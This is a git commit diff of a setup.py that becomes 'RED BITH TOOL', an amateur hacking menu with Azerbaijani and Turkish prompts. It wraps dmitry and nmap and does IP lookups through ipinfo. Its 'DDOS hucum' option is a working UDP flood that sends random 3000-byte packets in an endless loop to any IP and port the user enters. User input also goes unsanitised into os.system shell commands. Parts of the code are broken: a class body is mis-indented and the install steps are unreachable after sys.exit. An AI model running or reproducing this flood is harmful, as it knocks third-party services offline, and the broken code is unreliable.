cb4b34954156e15ee1f4c3257cc3b06e417d02ab
Red-BITH <136892734+Red-BITH@users.noreply.github.com>
2023-09-16 23:48:48 -0700

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,18 +1,332 @@
-print("\033[91mBOOT: v0.0.1 EARLY ACCESS\033[0m")
-import time
+import json
+from urllib.request import urlopen
 import os
-time.sleep(1)
+import socket
+import random
+import time
+import subprocess
+import signal
 os.system("clear")
-print("""\033[92mCHOOSE LANGUAGE:
+
+
+print("""\033[31mBOOT: v1.0.4\033[0m""")
+print("""\033[94m
+##############################################################                                                    
+# LİNUX?yoxsaTERMUX?---hansından bağlanırsınız?              #
+# 1---linux                                                  #
+# 2---termux(Yükləmələr var və uzun çəkə bilər,normaldır.    #
+# 3---əgər ilk dəfə girmirsinizsə 3 vəya başqa birşey yazın. #                               
+# BİLƏRƏK YANLIŞ CAVAB VERSƏNİZ SİSTEMİNİZDƏ XƏTA OLA BİLƏR! #
+# YÜKLƏMƏ ZAMANI SUAL GƏLDİYİ SAMAN Y YAZIN.                 #
+##############################################################
 \033[0m""")
-print("\033[94m 1. ENGLİSH/US\033[0m")
-print("\033[92m 2. Azərbaycan\Aze\033[0m")
-a = input("\033[0mEnter\Daxil et\033[0m")
+r = input("daxil et:")
+if(r == "1"):
+    import sys
+    from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QProgressBar
+    from PyQt5.QtCore import Qt, QTimer
+    import pygame.mixer
+    import time
+    
+    pygame.mixer.init()
+    pygame.mixer.music.load("X2Download.app - FNaF 3 “Night Start” Sound (320 kbps).mp3")
+    class LoadingScreen(QWidget):
+    def __init__(self):
+        super().__init__()
 
-if(a=="1"):
-  print("am")
+        self.setWindowTitle("Red_Tool")
+        self.setGeometry(100, 100, 300, 150)  # Pencere boyutunu ayarla
 
-if(a=="2"):
-  print("pek yakinda")
-  
-  
+        # Pencere boyutunu ve konumunu merkezin biraz üstüne ayarla
+        screen_geometry = QApplication.desktop().availableGeometry()
+        x = (screen_geometry.width() - self.width()) // 2
+        y = (screen_geometry.height() - self.height()) // 2 - 50
+        self.setGeometry(x, y, self.width(), self.height())
+        
+
+        layout = QVBoxLayout()
+
+        self.loading_label = QLabel("Bashladilir...")
+        self.loading_label.setAlignment(Qt.AlignCenter)
+        layout.addWidget(self.loading_label)
+
+        self.progress_bar = QProgressBar()
+        self.progress_bar.setRange(0, 0)  # Sürekli animasyon için aralığı ayarlar
+        layout.addWidget(self.progress_bar)
+
+        self.setLayout(layout)
+
+        # QTimer kullanarak pencereyi otomatik olarak kapat
+        self.timer = QTimer(self)
+        self.timer.timeout.connect(self.close_window)
+        self.timer.start(4000)  # 5 saniye bekleyip kapat
+
+    def close_window(self):
+        self.close()
+
+    if __name__ == "__main__":
+        app = QApplication(sys.argv)
+        window = LoadingScreen()
+        window.show()
+
+    from PIL import Image
+    import os
+
+# Fotoğraf dosyasının yolunu belirtin
+   
+
+   
+
+    pygame.mixer.music.play()
+    sys.exit(app.exec_()) 
+
+    os.system("pip install requests")
+    import requests
+    os.system("pip3 install termcolor")
+    os.system("pip3 install tabulate")
+    os.system("apt install python3")
+    os.system("apt install dmitry")
+    os.system("apt install nmap")
+    os.system("python -m pip install --upgrade pip")
+    os.system("python -m pip install --upgrade termcolor")
+    from tabulate import tabulate
+    from termcolor import colored
+    time.sleep(1)
+    print("\033[91mYüklənir....\033[91m")
+    print("\033[91m29%\033[91m")
+    time.sleep(1)
+    print("\033[91m57%\033[91m")
+    print("\033[93mERR: Data.Config: \033[93m" + "\033[91mSTR\033[91m")
+    time.sleep(1)
+    print("\033[95mPaketler çıxardılır:\033[95m")
+    time.sleep(5)
+    print("\033[93mGit-ignore müraciət edilir:\033[0m")
+    time.sleep(5)
+    print("\033[91m89% \033[91m")
+    print("\033[93mGit-ignore işə salınır:\033[0m")
+    print("\033[92m100%\033[92m")
+    time.sleep(3)
+    os.system("clear")
+   
+elif(r == "2"):
+    os.system("pkg update")
+    os.system("apt-get update&&upgrade")
+    os.system("pkg install openssl")
+    os.system("pip install termcolor")
+    os.system("pip install requests")
+    
+    os.system("pip install requests")
+    import requests
+    
+    os.system("pip3 installl termcolor")
+    os.system("pip install tabulate")
+    os.system("apt install python3")
+    os.system("apt install dmitry")
+    os.system("apt install nmap")
+    os.system("python -m pip install --upgrade pip")
+    os.system("python -m pip install --upgrade termcolor")
+    from tabulate import tabulate
+    from termcolor import colored
+    time.sleep(1)
+    print("\033[91mYüklənir....\033[91m")
+    print("\033[91m29%\033[91m")
+    time.sleep(1)
+    print("\033[91m57%\033[91m")
+    print("\033[93mERR: Data.Config: \033[93m" + "\033[91mSTR\033[91m")
+    time.sleep(1)
+    print("\033[95mPaketler çıxardılır:\033[95m")
+    time.sleep(5)
+    print("\033[93mGit-ignore müraciət edilir:\033[0m")
+    time.sleep(5)
+    print("\033[91m89% \033[91m")
+    print("\033[93mGit-ignore işə salınır:\033[0m")
+    print("\033[92m100%\033[92m")
+    time.sleep(3)
+    os.system("clear")
+elif(r == 3):
+    import os
+    time.sleep(1)
+    print("\033[91mYüklənir....\033[91m")
+    print("\033[91m29%\033[91m")
+    time.sleep(1)
+    print("\033[91m57%\033[91m")
+    print("\033[93mERR: Data.Config: \033[93m" + "\033[91mSTR\033[91m")
+    time.sleep(1)
+    print("\033[95mPaketler çıxardılır:\033[95m")
+    time.sleep(5)
+    print("\033[93mGit-ignore müraciət edilir:\033[0m")
+    time.sleep(5)
+    print("\033[91m89% \033[91m")
+    print("\033[93mGit-ignore işə salınır:\033[0m")
+    print("\033[92m100%\033[92m")
+    time.sleep(3)
+    os.system("clear")
+    os.system("clear")    
+    os.system("clear")
+    os.system("python uyarlama.py")
+    
+    
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    ENDC = '\033[0m'
+
+
+def print_colored(text, color):
+    print(color + text + Colors.ENDC)
+
+
+def durdur(signal, frame):
+    print_colored("Program söndürülür...", Colors.YELLOW)
+    os._exit(0)
+
+
+
+signal.signal(signal.SIGINT, durdur)
+
+
+metin = ('''\033[91m
+ /$$$$$$$        /$$$$$$$$       /$$$$$$$ 
+| $$__  $$      | $$_____/      | $$__  $$
+| $$  \ $$      | $$            | $$  \ $$
+| $$$$$$$/      | $$$$$         | $$  | $$
+| $$__  $$      | $$__/         | $$  | $$
+| $$  \ $$      | $$            | $$  | $$
+| $$  | $$      | $$$$$$$$      | $$$$$$$/
+|__/  |__/      |________/      |_______/ 
+                                          
+                                          
+\033[0m''') + ('''\033[92m
+ 
+ /$$$$$$$$        /$$$$$$         /$$$$$$        /$$            
+|__  $$__/       /$$__  $$       /$$__  $$      | $$            
+   | $$         | $$  \ $$      | $$  \ $$      | $$            
+   | $$         | $$  | $$      | $$  | $$      | $$            
+   | $$         | $$  | $$      | $$  | $$      | $$            
+   | $$         | $$  | $$      | $$  | $$      | $$            
+   | $$         |  $$$$$$/      |  $$$$$$/      | $$$$$$$$      
+   |__/          \______/        \______/       |________/  
+\033[92m''')
+print(metin)
+
+print_colored("|XOS GELMİSİNİZ|", Colors.BLUE)
+print_colored("|RED BITH TOOL|", Colors.RED)
+print_colored("| BY RED_BITH  |", Colors.GREEN)
+
+print_colored("""1.Hedef site haqqinda(Termuxda işləməyə bilər.)
+2.port scanner
+3.DDOS hucum
+4.Ip addres Melumat
+5.Hedef site banner decode(demo)
+""", Colors.YELLOW)
+
+secim = input("Nov sec:")
+
+if secim == '1':
+    hedefsite = input('Hedef site adresi')
+    os.system('dmitry ' + hedefsite)
+
+elif secim == '2':
+    hedef = input('Sayt adresi ve ya ip daxit et:')
+    os.system('nmap ' + hedef)
+
+elif secim == '3':
+    print_colored("""
+    ###########################
+    #  T00L - By RED_BITH     #
+    #  ATTACK- DDOS           #
+    #  HUCUMA HAZIRDIR        #
+    ###########################
+    """, Colors.RED)
+    
+    hedef_ip = input("Hedef ip daxil et:")
+    hedef_port = int(input("Hedef port:"))
+
+    bytes = random._urandom(3000)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sayac = 0
+    while True:
+        sock.sendto(bytes, (hedef_ip, hedef_port))
+        sayac += 1
+        print("\033[92mHUCUM EDILIR , gonderilen byte:%s\033[0m" % (sayac))
+
+elif secim == '4':
+    print_colored("""
+    ###############################
+    #  ATTACK- Ip melumat         #
+    #   BY RED-BITH               #
+    # ASAGIDAKI QAYDALARA EMEL ET #
+    ###############################
+    """, Colors.GREEN)
+    
+    print_colored("OZ ip niz haqqinda ? yaxud qarsi teref?", Colors.BLUE)
+    secim3 = input("SECIMINI ET--1-Oz ip; 2-qarsi ip:")
+    
+    if secim3 == '1':
+        def get_own_ip_info():
+            url = "https://ipinfo.io/json"
+            response = requests.get(url)
+            data = response.json()
+            return data
+
+        own_ip_info = get_own_ip_info()
+        print_colored(json.dumps(own_ip_info, indent=4), Colors.YELLOW)
+
+    elif secim3 == '2':
+        rabite = input("İP daxil et")
+        url = "https://ipinfo.io/" + rabite
+        response = urlopen(url)
+        data = json.load(response)
+
+        table_data = [
+            ["IP", data["ip"]],
+            ["city", data["city"]],
+            ["Region", data["region"]],
+            ["Country", data["country"]],
+            ["Postal Code", data["postal"]],
+            ["Organization", data["org"]],
+            ["ASN", data.get("asn", ["N/A"])[0]],
+            ["IP Range", data.get("ip_range", "N/A")],
+            ["Local Time", data.get("timezone", "N/A")],
+            ["Timezone", data.get("timezone", "N/A")],
+            ["Coordinates", data.get("loc", "N/A")],
+            ["Privacy Detection", data.get("privacy", "N/A")]
+        ]
+
+        table = tabulate(table_data, headers=["Field", "Value"], tablefmt="grid")
+        print_colored(table, Colors.BLUE)
+
+elif(secim == "5"):
+    print("""Hazırdır.Davam edilsin?
+    bəli -- 1
+    xeyr -- 2""")
+    y = input("Daxil et:")
+    if(y == "1"):
+        os.system("python3 str.py")
+        
+                
+                
+    
+    
+
+else:
+    print_colored("----Xəta baş verdi!", Colors.RED)
+    print_colored("""----Yenidən başlatma üçün : 1.
+    ----Çıxış etmək üçün :2.""", Colors.YELLOW)
+    secim2 = input("Qərar ver:")
+    
+    if secim2 == '1':
+        os.system("python RED_TOOL.py")
+    elif secim2 == '2':
+        print("ok")
+    else:
+        print("request= OK!")
+        time.sleep(1)
+
+
+    
+    
+        
